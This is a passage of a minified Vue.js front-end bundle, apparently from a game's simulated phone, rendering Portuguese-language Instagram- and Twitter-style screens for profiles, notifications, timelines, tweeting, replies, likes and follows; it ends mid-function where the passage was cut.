        class: "bg-theme text-2xl border-theme pl-12",
        modelValue: l.query,
        "onUpdate:modelValue": t[1] || (t[1] = e => l.query = e),
        placeholder: "Nome de usuário"
    }, null, 8, ["modelValue"])])]), l.query && !l.profiles ? (wl(), _l("h1", zv, "Nenhum resultado encontrado")) : (wl(), _l("ul", Bv, [(wl(!0), _l(bl, null, fa(l.profiles, (t => (wl(), _l("li", {
        key: t.id,
        onClick: n => e.$router.push("/instagram/profiles/" + t.username),
        class: "flex items-center mb-2 last:mb-0"
    }, [Pl("div", Hv, [Pl("img", {
        src: t.avatarURL,
        class: "p-0.5 w-24 h-24 rounded-full"
    }, null, 8, ["src"])]), Pl("span", null, g(t.username), 1), t.verified ? (wl(), _l(i, {
        key: 0,
        class: "w-8 h-8 ml-3 mt-2"
    })) : Ml("", !0)], 8, ["onClick"])))), 128))])), Pl(c)])
};
const qv = {
        components: {
            Header: og,
            NavBar: cg
        },
        setup() {
            jl("setDark")();
            const e = rt(!1),
                t = rt([]);
            return _o.backend.ig_notifications().then((n => {
                t.value = n, e.value = !1
            })).then((() => _o.backend.ig_saw_notifications())), {
                loading: e,
                notifications: t
            }
        }
    },
    Gv = {
        class: "flex flex-col bg-theme text-theme h-full"
    },
    Wv = {
        key: 0,
        class: "h-full flex flex-col flex-center"
    },
    Kv = {
        key: 1,
        class: "p-5 text-center"
    },
    Jv = {
        key: 2,
        class: "overflow-y-auto hide-scroll flex-1 p-5"
    },
    Xv = {
        class: "ml-4 mt-2 text-3xl"
    },
    Yv = {
        class: "text-gray-500"
    };
qv.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("app-loading"),
        i = dl("nav-bar");
    return wl(), _l("div", Gv, [Pl(o), l.loading ? (wl(), _l("div", Wv, [Pl(r, {
        style: {
            filter: "invert(1)"
        }
    })])) : l.notifications.length ? (wl(), _l("ul", Jv, [(wl(!0), _l(bl, null, fa(l.notifications, (t => {
        var n;
        return wl(), _l("li", {
            key: t.id,
            class: "flex items-start mb-5"
        }, [Pl("img", {
            class: "w-24 h-24 rounded-full",
            src: null != (n = t.avatarURL) ? n : e.$asset("/stock/user.svg")
        }, null, 8, ["src"]), Pl("p", Xv, [Il(g(t.content) + " ", 1), Pl("span", Yv, g(e.$filters.unixToRelative(t.created_at)), 1)])])
    })), 128))])) : (wl(), _l("h1", Kv, "Nenhuma notificação")), Pl(i)])
};
const Zv = {
        components: {
            Header: og,
            Bottom: cg
        },
        setup() {
            jl("setDark")();
            const e = jl("alert"),
                t = Ze({}),
                n = Ze({});
            Object.assign(n, sg.profile), Object.assign(t, sg.profile);
            const l = da((() => {
                for (let e of ["name", "username", "bio"])
                    if (t[e] != n[e]) return !0;
                return !1
            }));
            return {
                profile: n,
                changeAvatar: async function() {
                    try {
                        const e = await _o.useAnyImage("/instagram", !0);
                        t.avatarURL = n.avatarURL = e, sg.profile.avatarURL = e, _o.backend.ig_changeAvatar(e)
                    } catch (e) {}
                },
                hasChanges: l,
                save: function() {
                    _o.backend.ig_updateProfile({
                        name: n.name,
                        username: n.username,
                        bio: n.bio
                    }).then((l => {
                        if (null == l ? void 0 : l.error) e(l.error);
                        else {
                            for (let e of sg.stories.value) e.author.username == t.username && (e.author.username = n.username);
                            sg.sortStory(), Object.assign(t, n), Object.assign(sg.profile, n)
                        }
                    }))
                }
            }
        }
    },
    Qv = {
        class: "h-full bg-theme text-theme"
    },
    ex = {
        class: "mt-16 text-center"
    },
    tx = {
        class: "mt-8 mx-4"
    },
    nx = Pl("label", {
        class: "text-gray-400 font-semibold text-2xl"
    }, "Nome", -1),
    lx = {
        class: "mt-6 mx-4"
    },
    ax = Pl("label", {
        class: "text-gray-400 font-semibold text-2xl"
    }, "Usuário", -1),
    sx = {
        class: "mt-6 mx-4"
    },
    ox = Pl("label", {
        class: "text-gray-400 font-semibold text-2xl"
    }, "Bio", -1),
    rx = Pl("i", {
        class: "fal fa-check mr-2"
    }, null, -1),
    ix = Il(" Salvar ");
Zv.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("Bottom");
    return wl(), _l("div", Qv, [Pl(o), Pl("div", ex, [Pl("img", {
        class: "mx-auto w-48 h-48 rounded-full",
        src: l.profile.avatarURL
    }, null, 8, ["src"]), Pl("button", {
        onClick: t[1] || (t[1] = (...e) => l.changeAvatar && l.changeAvatar(...e)),
        class: "font-semibold text-blue-500"
    }, " Mudar foto de perfil ")]), Pl("div", tx, [nx, Zn(Pl("input", {
        "onUpdate:modelValue": t[2] || (t[2] = e => l.profile.name = e),
        maxlength: "32",
        class: "block w-full bg-transparent p-1 border-b border-theme"
    }, null, 512), [
        [ns, l.profile.name]
    ])]), Pl("div", lx, [ax, Zn(Pl("input", {
        "onUpdate:modelValue": t[3] || (t[3] = e => l.profile.username = e),
        maxlength: "24",
        class: "block w-full bg-transparent p-1 border-b border-theme"
    }, null, 512), [
        [ns, l.profile.username]
    ])]), Pl("div", sx, [ox, Zn(Pl("input", {
        maxlength: "255",
        "onUpdate:modelValue": t[4] || (t[4] = e => l.profile.bio = e),
        class: "block w-full bg-transparent p-1 border-b border-theme"
    }, null, 512), [
        [ns, l.profile.bio]
    ])]), l.hasChanges ? (wl(), _l("button", {
        key: 0,
        onClick: t[5] || (t[5] = (...e) => l.save && l.save(...e)),
        class: "absolute bottom-32 right-4 bg-blue-500 text-white rounded-xl p-2 px-4"
    }, [rx, ix])) : Ml("", !0), Pl(r)])
};
const cx = {
        components: {
            Bottom: cg,
            Header: og,
            Post: Sg,
            Menu: Xo
        },
        setup() {
            const e = ec(),
                t = rt(),
                n = Ze([]);

            function l(e) {
                l.last > Date.now() || (l.last = Date.now() + 1e3, _o.backend.ig_setFollow(t.value.id, e).then((() => {
                    t.value.isFollowed = e, t.value.followers += e ? 1 : -1
                })))
            }
            return _o.backend.ig_getProfile(e.params.id).then((e => {
                e ? (e.profile.isYou = e.profile.id == sg.profile.id, t.value = e.profile, t.value.hasStory = sg.stories.value.some((t => t.author.username == e.profile.username)), n.push(...e.posts)) : t.value = !1
            })), l.last = 0, _o.onceRoute("INSTAGRAM_DESTROY", (e => {
                const t = n.findIndex((t => t.id == e)); - 1 != t && n.splice(t, 1)
            })), {
                profile: t,
                posts: n,
                setFollow: l,
                getFollowers: function() {
                    _o.backend.ig_getFollowers(t.value.id).then((e => sg.showProfileMap(e)))
                },
                getFollowing: function() {
                    _o.backend.ig_getFollowing(t.value.id).then((e => sg.showProfileMap(e)))
                }
            }
        }
    },
    ux = {
        class: "bg-theme text-theme h-full flex flex-col"
    },
    dx = {
        key: 0,
        class: "p-3"
    },
    px = {
        key: 1,
        class: "p-3 flex items-center border-b border-theme shadow-lg"
    },
    fx = {
        class: "flex-1 flex flex-col items-start"
    },
    mx = {
        class: "ml-4 mb-4 flex"
    },
    hx = {
        class: "grid grid-cols-3 p-5 gap-5"
    },
    bx = {
        class: "text-center text-2xl"
    },
    gx = {
        class: "font-bold block"
    },
    vx = Pl("span", {
        class: "text-gray-500"
    }, "Posts", -1),
    xx = {
        class: "font-bold block"
    },
    yx = Pl("span", {
        class: "text-gray-500"
    }, "Seguidores", -1),
    kx = {
        class: "font-bold block"
    },
    wx = Pl("span", {
        class: "text-gray-500"
    }, "Seguindo", -1),
    Cx = {
        class: "text-2xl mb-4 mx-4"
    },
    _x = {
        class: "font-bold"
    },
    Ax = {
        class: "px-4 w-full"
    },
    Sx = {
        class: "overflow-y-auto hide-scroll grid grid-cols-3"
    },
    Rx = {
        key: 2,
        class: "text-center mt-4"
    };
cx.render = function(e, t, n, l, a, s) {
    var o;
    const r = dl("Header"),
        i = dl("app-verified"),
        c = dl("Bottom");
    return wl(), _l("div", ux, [Pl(r), !1 === l.profile ? (wl(), _l("h1", dx, "Perfil não encontrado")) : l.profile ? (wl(), _l("div", px, [Pl("div", fx, [Pl("div", mx, [Pl("div", {
        class: ["w-28 h-28", {
            "bg-instagram rounded-full": l.profile.hasStory
        }]
    }, [Pl("img", {
        src: l.profile.avatarURL,
        class: "w-28 h-28 p-0.5 rounded-full"
    }, null, 8, ["src"])], 2), Pl("div", hx, [Pl("div", bx, [Pl("span", gx, g(l.profile.posts || 0), 1), vx]), Pl("div", {
        class: "text-center text-2xl",
        onClick: t[1] || (t[1] = (...e) => l.getFollowers && l.getFollowers(...e))
    }, [Pl("span", xx, g(l.profile.followers || 0), 1), yx]), Pl("div", {
        class: "text-center text-2xl",
        onClick: t[2] || (t[2] = (...e) => l.getFollowing && l.getFollowing(...e))
    }, [Pl("span", kx, g(l.profile.following || 0), 1), wx])])]), Pl("div", Cx, [Pl("h1", _x, [Il(g(null != (o = l.profile.name) ? o : l.profile.username) + " ", 1), l.profile.verified ? (wl(), _l(i, {
        key: 0,
        class: "inline ml-1 mb-0.5 w-6 h-6"
    })) : Ml("", !0)]), Pl("p", null, g(l.profile.bio), 1)]), Pl("div", Ax, [l.profile.isYou ? (wl(), _l("button", {
        key: 0,
        onClick: t[3] || (t[3] = t => e.$router.push("/instagram/edit")),
        class: "block w-full border border-theme p-1 rounded-xl"
    }, " Editar perfil ")) : (wl(), _l("button", {
        key: 1,
        onClick: t[4] || (t[4] = e => l.setFollow(!l.profile.isFollowed)),
        class: "block w-full bg-blue-500 p-1 text-white rounded-xl"
    }, g(l.profile.isFollowed ? "Deixar de seguir" : "Seguir"), 1))])])])) : Ml("", !0), Pl("ul", Sx, [(wl(!0), _l(bl, null, fa(l.posts, (t => (wl(), _l("li", {
        key: t.id,
        onClick: n => e.$router.push("/instagram/posts/" + t.id)
    }, [Pl("div", {
        class: "h-56 bg-cover bg-center",
        style: {
            backgroundImage: "url(" + t.image + ")"
        }
    }, null, 4)], 8, ["onClick"])))), 128))]), l.profile && !l.posts.length ? (wl(), _l("h3", Rx, "Este usuário não tem publicações")) : Ml("", !0), Pl(c)])
};
const Tx = {
        components: {
            Header: og,
            NavBar: cg,
            Post: Sg
        },
        setup() {
            const e = rt(!0),
                t = rt(),
                n = Qi(),
                l = ec();
            return _o.backend.ig_getPost(l.params.id).then((n => {
                t.value = n, e.value = !1
            })), _o.onceRoute("INSTAGRAM_DESTROY", (e => {
                var l;
                (null == (l = t.value) ? void 0 : l.id) == e && n.back()
            })), {
                loading: e,
                post: t
            }
        }
    },
    Ex = {
        class: "flex flex-col bg-theme text-theme h-full"
    },
    Px = {
        key: 0
    },
    Lx = {
        key: 2
    };
Tx.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("Post");
    return wl(), _l("div", Ex, [Pl(o, {
        back: "Voltar"
    }), l.loading ? (wl(), _l("div", Px)) : l.post ? (wl(), _l(r, {
        key: 1,
        post: l.post
    }, null, 8, ["post"])) : (wl(), _l("h1", Lx, "Post não encontrado"))])
};
const Ix = rt(),
    Ox = {
        setup() {
            var e;
            return {
                logo: null != (e = _o.settings.twitterLogo) ? e : globalThis.twitterLogo,
                profile: Ix,
                scrollTop: function() {
                    const e = document.querySelector(".overflow-y-auto");
                    e && (e.scrollTop = 0)
                }
            }
        }
    },
    Mx = {
        class: "flex-shrink-0 h-28 border-b border-theme flex justify-center items-end pb-3"
    };
Ox.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", Mx, [Pl("img", {
        onClick: t[1] || (t[1] = t => {
            var n;
            return e.$router.push("/twitter/profiles/" + (null == (n = l.profile) ? void 0 : n.id))
        }),
        class: "absolute left-8 w-12 h-12 rounded-full",
        src: l.profile.avatarURL
    }, null, 8, ["src"]), l.logo ? (wl(), _l("img", {
        key: 0,
        class: "w-12 h-12",
        src: l.logo
    }, null, 8, ["src"])) : (wl(), _l("i", {
        key: 1,
        onClick: t[2] || (t[2] = (...e) => l.scrollTop && l.scrollTop(...e)),
        class: "fab fa-twitter text-4xl text-twitter"
    })), Pl("i", {
        onClick: t[3] || (t[3] = t => e.$router.push("/twitter/create")),
        class: "absolute right-8 top-16 fa fa-feather-alt text-twitter"
    })])
};
const Vx = {
        props: {
            tag: {
                default: "li"
            },
            post: {
                required: !0
            }
        },
        emits: ["setLike", "setRetweet"],
        setup(e, t) {
            const n = Qi(),
                l = e.post,
                a = l.retweeted_by ? l.tweet_id : l.id;
            return {
                id: a,
                redirect() {
                    n.push(`/twitter/posts/${a}`)
                },
                retweet() {
                    _o.backend["twitter_" + (l.retweeted ? "unretweet" : "retweet")](a).then((e => {
                        t.emit("setRetweet", a, e)
                    }))
                },
                like() {
                    _o.backend["twitter_" + (l.liked ? "dislike" : "like")](a).then((e => {
                        t.emit("setLike", a, e)
                    }))
                },
                showOptions() {
                    const e = {};
                    (l.author.id === Ix.value.id || _o.identity.moderator) && (e.delete = "Excluir tweet"), e.view = "Ver tweet", bo().request(e, 25, !0).then((e => {
                        "delete" === e ? _o.backend.twitter_destroy(a) : "view" === e && this.redirect()
                    }), (() => {}))
                }
            }
        }
    },
    Dx = {
        key: 0,
        class: "ml-16 mb-1 text-lg text-gray-500 font-bold"
    },
    Ux = Pl("i", {
        class: "fas fa-retweet"
    }, null, -1),
    Nx = {
        class: "flex"
    },
    $x = {
        class: "ml-4 flex-1 flex flex-col"
    },
    jx = {
        class: "flex items-center text-xl mb-1"
    },
    Fx = {
        class: "font-bold mr-2"
    },
    zx = {
        class: "text-gray-500"
    },
    Bx = Pl("i", {
        class: "fas fa-ellipsis-v"
    }, null, -1),
    Hx = {
        class: "text-2xl"
    },
    qx = {
        class: "flex justify-between text-2xl mt-3 w-96"
    },
    Gx = Pl("i", {
        class: "far fa-comment mr-2"
    }, null, -1),
    Wx = Pl("i", {
        class: "far fa-retweet mr-2"
    }, null, -1);
Vx.render = function(e, t, n, l, a, s) {
    const o = dl("app-verified");
    return wl(), _l(fl(n.tag), {
        class: "p-3 border-b border-theme text-theme"
    }, {
        default: en((() => {
            var a;
            return [n.post.retweeted_by ? (wl(), _l("p", Dx, [Ux, Il(" " + g(n.post.retweeted_by) + " retweetou ", 1)])) : Ml("", !0), Pl("div", Nx, [Pl("img", {
                onClick: t[1] || (t[1] = t => e.$router.push("/twitter/profiles/" + n.post.author.id)),
                class: "w-20 h-20 rounded-full",
                src: n.post.author.avatarURL,
                alt: ""
            }, null, 8, ["src"]), Pl("div", $x, [Pl("div", jx, [Pl("span", Fx, g(n.post.author.name), 1), n.post.author.verified ? (wl(), _l(o, {
                key: 0,
                class: "mr-2 w-5 h-5"
            })) : Ml("", !0), Pl("span", zx, " @" + g(n.post.author.username) + " · " + g(e.$filters.unixToRelative(null != (a = n.post.created_at) ? a : 0)), 1), Pl("button", {
                class: "ml-auto px-4",
                onClick: t[2] || (t[2] = (...e) => l.showOptions && l.showOptions(...e))
            }, [Bx])]), Pl("p", Hx, g(n.post.content), 1), Pl("div", qx, [Pl("button", {
                onClick: t[3] || (t[3] = (...e) => l.redirect && l.redirect(...e))
            }, [Gx, Pl("span", null, g(n.post.comments), 1)]), Pl("button", {
                onClick: t[4] || (t[4] = (...e) => l.retweet && l.retweet(...e)),
                class: {
                    "text-green-400": n.post.retweeted
                }
            }, [Wx, Pl("span", null, g(n.post.retweets), 1)], 2), Pl("button", {
                onClick: t[5] || (t[5] = (...e) => l.like && l.like(...e)),
                class: {
                    "text-red-500": n.post.liked
                }
            }, [Pl("i", {
                class: [{
                    fas: n.post.liked
                }, "far fa-heart mr-2"]
            }, null, 2), Pl("span", null, g(n.post.likes), 1)], 2)])])])]
        })),
        _: 1
    })
};
const Kx = {
    components: {
        Post: Vx
    },
    props: ["all"],
    setup(e) {
        const t = e.all;
        _o.onceRoute("TWITTER_DESTROY", (e => {
            let n = 0;
            for (; - 1 != (n = t.findIndex((t => t.id == e || t.tweet_id == e)));) t.splice(n, 1)
        }));
        const n = (e, n, l = 1) => _o.onceRoute(e, (e => {
            t.filter((t => t.id == e || t.tweet_id == e && t.retweeted_by)).forEach((e => {
                e[n] += l
            }))
        }));
        return n("TWITTER_LIKE", "likes"), n("TWITTER_DISLIKE", "likes", -1), n("TWITTER_REPLY", "comments"), n("TWITTER_RETWEET", "retweets"), n("TWITTER_UNRETWEET", "retweets", -1), {
            setLike: function(e, n) {
                t.filter((t => t.id == e || t.tweet_id == e && t.retweeted_by)).forEach((e => {
                    e.liked = n
                }))
            },
            setRetweet: function(e, n) {
                t.filter((t => t.id == e || t.tweet_id == e && t.retweeted_by)).forEach((e => e.retweeted = n));
                const l = t.findIndex((t => t.tweet_id == e && t.retweeted_by));
                !n && l >= 0 && t.splice(l, 1)
            }
        }
    }
};
Kx.render = function(e, t, n, l, a, s) {
    const o = dl("Post");
    return wl(), _l("ul", null, [(wl(!0), _l(bl, null, fa(n.all, (e => (wl(), _l(o, {
        tag: "li",
        key: e.id,
        post: e,
        onSetLike: l.setLike,
        onSetRetweet: l.setRetweet
    }, null, 8, ["post", "onSetLike", "onSetRetweet"])))), 128))])
};
const Jx = {
        components: {
            Header: Ox,
            Timeline: Kx
        },
        setup() {
            jl("setDark")();
            const e = Ze([]);
            if (_o.localhost) {
                Ix.value = {
                    name: "Jester Iruka",
                    username: "jesteriruka",
                    bio: "Programador do celular",
                    avatarURL: "https://pbs.twimg.com/profile_images/1408692225513607170/2fgNPFXo_400x400.jpg"
                };
                for (let t = 0; t < 100; t += 1) e.push({
                    id: t + 1,
                    author: {
                        name: "John Doe",
                        username: "johndoe",
                        avatarURL: "https://picsum.photos/200"
                    },
                    content: "Lorem ipsum dolor sit amet ".repeat(10),
                    likes: Math.floor(1e3 * Math.random()),
                    retweets: Math.floor(1e3 * Math.random()),
                    comments: Math.floor(100 * Math.random()),
                    liked: Math.random() < .75,
                    retweeted: Math.random() < .75
                })
            }
            return _o.backend.twitter().then((t => {
                t ? (Ix.value = t, _o.backend.twitter_timeline().then((t => {
                    Object.assign(e, t), _o.onceRoute("TWITTER_TWEET", (t => e.unshift(t)))
                }))) : "/twitter" === kO.currentRoute.value.path && kO.replace("/twitter/register")
            })), {
                profile: Ix,
                posts: e
            }
        }
    },
    Xx = {
        key: 0,
        class: "flex flex-col h-full bg-theme"
    },
    Yx = {
        key: 1,
        class: "h-full bg-theme"
    };
Jx.render = function(e, t, n, l, a, s) {
    const o = dl("Header"),
        r = dl("Timeline");
    return l.profile ? (wl(), _l("div", Xx, [Pl(o), Pl(r, {
        class: "overflow-y-auto hide-scroll",
        all: l.posts
    }, null, 8, ["all"])])) : (wl(), _l("div", Yx))
};
const Zx = {
        setup() {
            var e;
            jl("setDark")();
            const t = jl("alert"),
                n = rt({});
            const l = null != (e = _o.settings.twitterLogo) ? e : globalThis.twitterLogo;
            return {
                form: n,
                register: function() {
                    _o.backend.twitter_register(n.value).then((e => {
                        e && e.error ? t(e.error) : kO.replace("/twitter")
                    }))
                },
                logo: l
            }
        }
    },
    Qx = sn("data-v-571aa757");
ln("data-v-571aa757");
const ey = {
        class: "h-full bg-theme"
    },
    ty = {
        class: "h-28 flex items-end justify-center pb-4"
    },
    ny = {
        key: 1,
        class: "fab fa-twitter text-4xl text-twitter"
    },
    ly = {
        class: "w-10/12 mx-auto mt-32 text-theme"
    },
    ay = {
        class: "text-right mt-6"
    };
an();
const sy = Qx(((e, t, n, l, a, s) => (wl(), _l("div", ey, [Pl("div", ty, [Pl("span", {
    onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t)),
    class: "absolute left-4 text-3xl text-twitter"
}, "Cancelar"), l.logo ? (wl(), _l("img", {
    key: 0,
    class: "w-12 h-12",
    src: l.logo
}, null, 8, ["src"])) : (wl(), _l("i", ny))]), Pl("div", ly, [Zn(Pl("input", {
    "onUpdate:modelValue": t[2] || (t[2] = e => l.form.name = e),
    maxlength: "24",
    class: "border-b border-theme w-full text-3xl p-2 bg-theme",
    placeholder: "Nome"
}, null, 512), [
    [ns, l.form.name]
]), Zn(Pl("input", {
    "onUpdate:modelValue": t[3] || (t[3] = e => l.form.username = e),
    maxlength: "16",
    class: "mt-8 border-b border-theme w-full text-3xl p-2 bg-theme",
    placeholder: "Nome de usuário"
}, null, 512), [
    [ns, l.form.username]
]), Zn(Pl("input", {
    "onUpdate:modelValue": t[4] || (t[4] = e => l.form.bio = e),
    maxlength: "255",
    class: "mt-8 border-b border-theme w-full text-3xl p-2 bg-theme",
    placeholder: "Biografia"
}, null, 512), [
    [ns, l.form.bio]
]), Pl("div", ay, [Pl("button", {
    onClick: t[5] || (t[5] = (...e) => l.register && l.register(...e)),
    class: "bg-twitter text-white p-2 px-4 rounded-full"
}, "Cadastrar")])])]))));
Zx.render = sy, Zx.__scopeId = "data-v-571aa757";
const oy = {
        setup() {
            jl("setDark")();
            const e = jl("alert"),
                t = Qi(),
                n = Ze({});
            return {
                profile: Ix,
                form: n,
                submit: function() {
                    _o.backend.twitter_store(n.content).then((n => {
                        n && n.error ? e(n.error) : t.back()
                    }))
                }
            }
        }
    },
    ry = sn("data-v-4a7be0d9");
ln("data-v-4a7be0d9");
const iy = {
        class: "flex flex-col h-full bg-theme"
    },
    cy = {
        class: "mt-16 px-8 flex justify-between"
    },
    uy = {
        class: "p-8 flex h-full"
    };
an();
const dy = ry(((e, t, n, l, a, s) => (wl(), _l("div", iy, [Pl("div", cy, [Pl("i", {
    onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t)),
    class: "fal fa-times text-twitter text-4xl"
}), Pl("button", {
    onClick: t[2] || (t[2] = (...e) => l.submit && l.submit(...e)),
    class: "bg-twitter text-white text-2xl font-bold px-6 py-2 rounded-full"
}, "Tweet")]), Pl("div", uy, [Pl("img", {
    class: "w-16 h-16 mr-4 rounded-full",
    src: l.profile.avatarURL,
    alt: ""
}, null, 8, ["src"]), Zn(Pl("textarea", {
    "onUpdate:modelValue": t[3] || (t[3] = e => l.form.content = e),
    maxlength: "280",
    class: "w-full h-full resize-none bg-transparent text-theme",
    placeholder: "O que está acontecendo?"
}, null, 512), [
    [ns, l.form.content]
])])]))));
oy.render = dy, oy.__scopeId = "data-v-4a7be0d9";
const py = {
        components: {
            Timeline: Kx
        },
        setup() {
            jl("setDark")();
            const e = ec(),
                t = Qi(),
                n = jl("alert"),
                l = rt({}),
                a = Ze([]),
                s = rt("00:00"),
                o = rt("1 Jan 73"),
                r = rt();
            return _o.localhost && (l.value = {
                id: 1,
                author: {
                    name: "Usuario",
                    username: "usuario",
                    avatarURL: "https://picsum.photos/200"
                },
                content: "Hello"
            }), An((() => {
                e.params.id && _o.backend.twitter_view(e.params.id).then((e => {
                    l.value = e.tweet, a.length = 0, Object.assign(a, e.comments);
                    const [t, n] = Ns(e.tweet.created_at);
                    o.value = t, s.value = n
                }))
            })), vn((() => {
                const e = (e, t) => _o.onceRoute(e, (e => e == l.value.id && t()));
                _o.onceRoute("TWITTER_DESTROY", (e => {
                    if (l.value.id != e) {
                        const t = a.indexOf((t => t.id == e));
                        return t >= 0 && a.index(t)
                    }
                    t.back(), n("Este tweet foi excluído")
                })), e("TWITTER_LIKE", (() => l.value.likes++)), e("TWITTER_RETWEET", (() => l.value.retweets++)), e("TWITTER_DISLIKE", (() => l.value.likes--)), e("TWITTER_UNRETWEET", (() => l.value.retweets--))
            })), {
                content: r,
                createReply: function() {
                    const e = r.value.trim();
                    e && _o.backend.twitter_reply(parseInt(l.value.id), e).then((e => {
                        if (e.error) return n(e.error);
                        e && a.unshift(e), r.value = ""
                    }))
                },
                mine: Ix,
                tweet: l,
                hour: s,
                date: o,
                android: _o.settings.isAndroid,
                comments: a,
                like: function() {
                    _o.backend["twitter_" + (l.value.liked ? "dislike" : "like")](l.value.id).then((e => {
                        l.value.liked = e
                    }))
                },
                retweet: function() {
                    _o.backend["twitter_" + (l.value.retweeted ? "unretweet" : "retweet")](l.value.id).then((e => {
                        l.value.retweeted = e
                    }))
                }
            }
        }
    },
    fy = {
        class: "flex flex-col h-full bg-theme text-theme"
    },
    my = Pl("div", {
        class: "h-16 flex-shrink-0 bg-theme"
    }, null, -1),
    hy = {
        class: "overflow-y-auto hide-scroll"
    },
    by = {
        key: 0,
        class: "px-5"
    },
    gy = {
        class: "flex items-center"
    },
    vy = {
        class: "ml-4"
    },
    xy = {
        class: "flex items-center"
    },
    yy = {
        class: "text-gray-500"
    },
    ky = {
        class: "mt-6 text-4xl leading-snug"
    },
    wy = {
        class: "mt-4 text-gray-500 text-xl"
    },
    Cy = {
        class: "mt-4 flex text-2xl border-t border-b border-theme py-4"
    },
    _y = {
        class: "text-gray-500"
    },
    Ay = {
        class: "text-theme"
    },
    Sy = Il(" Retweets"),
    Ry = {
        class: "ml-5 text-gray-500"
    },
    Ty = {
        class: "text-theme"
    },
    Ey = Il(" Likes"),
    Py = {
        class: "flex justify-between items-center text-2xl border-b border-theme py-4 px-8"
    },
    Ly = Pl("i", {
        class: "fal fa-comment text-4xl"
    }, null, -1),
    Iy = Pl("i", {
        class: "fal fa-retweet text-4xl"
    }, null, -1),
    Oy = {
        key: 1,
        class: "p-4"
    },
    My = {
        class: "flex ml-16 mb-2 justify-between items-center"
    },
    Vy = {
        class: "text-2xl text-gray-500"
    },
    Dy = Pl("i", {
        class: "fal fa-level-up transform-flip-x mr-2"
    }, null, -1),
    Uy = Il(" Respondendo "),
    Ny = {
        class: "text-twitter"
    },
    $y = {
        class: "flex items-start border-b border-theme pb-4"
    };
py.render = function(e, t, n, l, a, s) {
    var o;
    const r = dl("app-verified"),
        i = dl("Timeline");
    return wl(), _l("div", fy, [my, Pl("div", hy, [(null == (o = l.tweet) ? void 0 : o.id) ? (wl(), _l("div", by, [Pl("div", gy, [Pl("img", {
        onClick: t[1] || (t[1] = t => e.$router.push("/twitter/profiles/" + l.tweet.author.id)),
        class: "w-24 h-24 rounded-full",
        src: l.tweet.author.avatarURL
    }, null, 8, ["src"]), Pl("div", vy, [Pl("div", xy, [Pl("h1", null, g(l.tweet.author.name), 1), l.tweet.author.verified ? (wl(), _l(r, {
        key: 0,
        class: "ml-2 w-6 h-6"
    })) : Ml("", !0)]), Pl("h1", yy, "@" + g(l.tweet.author.username), 1)])]), Pl("p", ky, g(l.tweet.content), 1), Pl("p", wy, g(l.hour) + " · " + g(l.date) + " · Twitter for " + g(l.android ? "Kantroid" : "KantOS"), 1), Pl("div", Cy, [Pl("p", _y, [Pl("b", Ay, g(l.tweet.retweets), 1), Sy]), Pl("p", Ry, [Pl("b", Ty, g(l.tweet.likes), 1), Ey])])])) : Ml("", !0), Pl("div", Py, [Pl("button", {
        onClick: t[2] || (t[2] = e => l.content = null == l.content ? "" : null)
    }, [Ly]), Pl("button", {
        onClick: t[3] || (t[3] = (...e) => l.retweet && l.retweet(...e)),
        class: {
            "text-green-400": l.tweet.retweeted
        }
    }, [Iy], 2), Pl("button", {
        onClick: t[4] || (t[4] = (...e) => l.like && l.like(...e)),
        class: {
            "text-red-500": l.tweet.liked
        }
    }, [Pl("i", {
        class: ["fal fa-heart text-4xl", {
            fas: l.tweet.liked
        }]
    }, null, 2)], 2)]), null != l.content ? (wl(), _l("div", Oy, [Pl("div", My, [Pl("p", Vy, [Dy, Uy, Pl("span", Ny, "@" + g(l.tweet.author.username), 1)]), Pl("button", {
        onClick: t[5] || (t[5] = (...e) => l.createReply && l.createReply(...e)),
        class: "bg-twitter px-6 py-2 text-xl text-white rounded-full"
    }, "Responder")]), Pl("div", $y, [Pl("img", {
        class: "w-20 h-20 rounded-full",
        src: l.mine.avatarURL
    }, null, 8, ["src"]), Zn(Pl("textarea", {
        onKeydown: t[6] || (t[6] = us(is(((...e) => l.createReply && l.createReply(...e)), ["prevent"]), ["enter"])),
        class: "ml-3 mt-5 w-full h-36 bg-transparent text-theme resize-none hide-scroll",
        "onUpdate:modelValue": t[7] || (t[7] = e => l.content = e),
        placeholder: "Tweete sua resposta"
    }, null, 544), [
        [ns, l.content]
    ])])])) : Ml("", !0), Pl(i, {
        all: l.comments
    }, null, 8, ["all"])])])
};
const jy = {
        components: {
            Timeline: Kx
        },
        setup() {
            jl("setDark")();
            const e = ec(),
                t = rt(),
                n = Ze([]);
            return _o.localhost && (t.value = {
                name: "Jester Iruka",
                username: "jesteriruka",
                verified: 1
            }, n.push(...Array(50).fill(0).map(((e, t) => ({
                id: t + 1,
                author: {
                    avatarURL: "https://picsum.photos/200"
                },
                content: "Hello world " + t
            }))))), _o.backend.twitter_profile(e.params.id).then((e => {
                t.value = null == e ? void 0 : e.profile, Object.assign(n, null == e ? void 0 : e.posts)
            })), {
                dark: _o.darkTheme,
                profile: t,
                posts: n,
                mine: Ix,
                follow: async function() {
                    await _o.backend.twitter_follow(e.params.id) && (t.value.followers += 1, t.value.isFollowed = !0)
                },
                unfollow: async function() {
                    await _o.backend.twitter_unfollow(e.params.id) && (t.value.followers -= 1, t.value.isFollowed = !1)
                }
            }
        }
    },
    Fy = {
        class: "flex flex-col h-full bg-theme"
    },
    zy = Pl("div", {
        class: "h-12 flex-shrink-0 bg-theme-accent"
    }, null, -1),
    By = {
        key: 0,
        class: "overflow-y-auto hide-scroll"
    },
    Hy = {
        class: "relative"
    },
    qy = {
        class: "pt-4 text-right h-20"
    },
    Gy = {
        class: "text-theme px-4 border-b border-theme"
    },
    Wy = {
        class: "flex items-center"
    },
    Ky = {
        class: "text-4xl"
    },
    Jy = {
        class: "text-gray-500 text-2xl my-2"
    },
    Xy = {
        class: "text-xl"
    },
    Yy = {
        class: "flex text-2xl my-4"
    },
    Zy = Il(),
    Qy = Pl("span", {
        class: "text-gray-500"
    }, "Seguindo", -1),
    ek = {
        class: "ml-6"
    },
    tk = Il(),
    nk = Pl("span", {
        class: "text-gray-500"
    }, "Seguidores", -1);
jy.render = function(e, t, n, l, a, s) {
    var o, r, i, c;
    const u = dl("app-verified"),
        d = dl("Timeline");
    return wl(), _l("div", Fy, [zy, l.profile ? (wl(), _l("div", By, [Pl("div", Hy, [Pl("img", {
        class: "w-full h-56",
